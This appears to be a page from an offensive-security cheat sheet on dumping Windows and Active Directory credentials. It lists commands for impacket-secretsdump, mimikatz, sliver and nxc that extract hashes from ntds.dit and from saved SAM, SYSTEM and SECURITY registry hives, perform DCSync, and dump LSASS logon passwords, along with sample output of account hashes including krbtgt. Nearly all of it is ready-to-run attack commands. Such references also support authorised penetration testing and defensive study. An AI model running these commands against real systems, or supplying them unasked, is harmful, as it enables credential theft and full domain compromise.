---
title: "secretsdump"
date: 2025-7-18
tags: ["SAM", "SYSTEM", "SECURITY", "Dcsync", "Impacket", "secretsdump", "Domain Controller", "Credential Dumping", "Active Directory", "Windows", "Ntds.Dit", "Hive"]
---

### Convert ntds.dit to .sqlite

```console
ntdsdotsqlite ntds.dit --system SYSTEM -o ntds.sqlite
```

<small>*Ref: [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite)*</small>

### With ntds.dit and SYSTEM hive

{{< tab set1 tab1 >}}impacket{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

```console {class="sample-code"}
$ impacket-secretsdump -ntds ntds.dit -system system LOCAL
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
---[SNIP]---
[*] Cleaning up...
```

{{< /tabcontent >}}

### With SAM, SYSTEM and SECURITY Hives

{{< tab set2 tab1 >}}impacket{{< /tab >}}
{{< tab set2 tab2 >}}mimikatz{{< /tab >}}
{{< tab set2 tab3 >}}sliver{{< /tab >}}
{{< tabcontent set2 tab1 >}}

```console
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
```

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

```console
reg save HKLM\SYSTEM system
```

```console
reg save HKLM\security security
```

```console
reg save hklm\sam sam
```

```console
.\mimikatz.exe "lsadump::secrets /system:SYSTEM /security:SECURITY"
```

```console
.\mimikatz.exe "lsadump::sam /system:SYSTEM /sam:SAM"
```

{{< /tabcontent >}}
{{< tabcontent set2 tab3 >}}

```console
reg save HKLM\SYSTEM system
```

```console
reg save HKLM\security security
```

```console
reg save hklm\sam sam
```

```console
mimikatz -- '"lsadump::secrets /system:C:\SYSTEM /security:C:\SECURITY"'
```

```console
mimikatz -- '"lsadump::sam /system:C:\SYSTEM /sam:C:\SAM"'
```

{{< /tabcontent >}}


### With DCsync Right

{{< tab set3 tab1 >}}impacket{{< /tab >}}
{{< tab set3 tab2 >}}nxc{{< /tab >}}
{{< tab set3 tab3 >}}mimikatz{{< /tab >}}
{{< tabcontent set3 tab1 >}}

```console
# Password
impacket-secretsdump '<USER>:<PASSWORD>@<TARGET>'
```

```console
# NTLM
impacket-secretsdump '<DOMAIN>/<USER>@<DC>' -hashes ':<HASH>'
```

```console
# Kerberos
impacket-secretsdump -k -no-pass -dc-ip <DC_IP> <DC>
```

{{< /tabcontent >}}
{{< tabcontent set3 tab2 >}}

```console
nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -H <HASH> --ntds
```

{{< /tabcontent >}}
{{< tabcontent set3 tab3 >}}

```console
.\mimikatz.exe "lsadump::dcsync /all" "exit"
```

```console
# Dump old creds
.\mimikatz.exe "lsadump::dcsync /user:<DOMAIN>\<USER> /history" "exit"
```

{{< /tabcontent >}}

### With NT AUTHORITY\SYSTEM / Administrator

{{< tab set4 tab1 >}}mimikatz{{< /tab >}}
{{< tab set4 tab2 >}}sliver{{< /tab >}}
{{< tabcontent set4 tab1 >}}

```console
.\mimikatz.exe "sekurlsa::logonpasswords"
```

```console
.\mimikatz.exe "lsadump::lsa /patch"
```

{{< /tabcontent >}}
{{< tabcontent set4 tab2 >}}

```console
mimikatz -- '"sekurlsa::logonpasswords"'
```

```console
mimikatz -- '"lsadump::lsa /patch"'
```

{{< /tabcontent >}}